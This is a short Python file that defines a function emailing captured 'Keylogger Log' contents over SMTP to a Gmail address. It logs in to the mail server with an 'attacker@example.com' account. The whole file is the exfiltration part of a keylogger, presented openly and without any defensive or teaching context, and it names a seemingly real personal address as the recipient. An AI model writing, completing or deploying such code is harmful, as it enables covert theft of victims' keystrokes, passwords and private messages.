import smtplib
from email.mime.text import MIMEText

def send_email(log_content):
    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylogger Log'
    msg['From'] = 'ptandjiria@gmail.com'
    msg['To'] = 'ptandjiria@gmail.com'

    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login('attacker@example.com', 'password')
        server.send_message(msg)
